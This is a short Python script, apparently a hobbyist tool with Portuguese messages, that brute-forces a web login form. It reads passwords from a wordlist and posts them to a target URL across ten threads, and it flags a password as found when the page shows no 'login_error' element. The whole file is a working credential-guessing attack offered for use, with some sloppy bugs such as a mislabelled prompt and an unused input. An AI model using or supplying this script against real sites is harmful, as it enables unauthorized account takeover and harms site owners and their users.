import requests
import sys
import time
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

url = input("Enter the username: ")
username = input("Enter the username: ")
error = input("Enter the login failed string: ")

z = """
    [*]-------------------------[*]
        Verificando servidor...
    [*]-------------------------[*]
"""

for c in z:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.01)

def brute(password):
    count = 0
    print("\033[1;31m"+"[-] tentativa número [" + str(count) + "] LOGIN: " + username + " / SENHA: " + password)
    data_dict = {"user": username, "password": password}
    
    try:
        res = requests.post(url, data=data_dict)
        soup = BeautifulSoup(res.content, 'html.parser')
        div_login_error = soup.find("div", id="login_error")

        if div_login_error:
            pass
        else:
            print("\033[1;32m"+"[+] senha encontrada --> " + password)
            return password

    except requests.exceptions.ConnectionError:
        print("\033[1;31m"+"[-] erro na conexão com o servidor")
        return None

try:
    with open("gtfoods.txt", "r") as passwords_file:
        passwords = [password.strip() for password in passwords_file]

        with ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(brute, passwords)

            for result in results:
                if result is not None:
                    break

except:
    print("\033[1;31m"+"[-] Brute Force Cancelado")
